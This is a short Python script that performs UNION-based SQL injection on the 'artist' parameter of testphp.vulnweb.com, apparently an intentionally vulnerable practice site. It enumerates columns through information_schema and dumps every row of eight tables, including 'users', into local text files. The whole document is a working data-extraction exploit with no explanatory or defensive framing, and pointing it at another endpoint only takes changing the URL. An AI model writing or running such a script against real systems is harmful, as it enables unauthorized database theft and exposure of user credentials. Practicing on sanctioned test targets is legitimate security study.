import requests
import sys

URL = "http://testphp.vulnweb.com/artists.php?artist=-1"
TABLES = ["artists", "carts", "categ", "featured", "guestbook", "pictures", "products", "users"]

def extract(query):
    payload = f" UNION SELECT 1,({query}),3"
    r = requests.get(URL + payload)
    if "artist: " in r.text:
        return r.text.split("artist: ")[1].split("<")[0]
    return None

for t in TABLES:
    print(f"Dumping {t}...")
    # Get columns
    cols_query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{t}'"
    cols = extract(cols_query)
    if not cols:
        continue
    
    # Get row count
    count_query = f"SELECT count(*) FROM {t}"
    count = int(extract(count_query) or 0)
    
    with open(f"{t}.txt", "w") as f:
        for i in range(count):
            row_query = f"SELECT concat_ws(0x3a, {cols}) FROM {t} LIMIT {i}, 1"
            row_data = extract(row_query)
            if row_data:
                f.write(row_data + "\n")
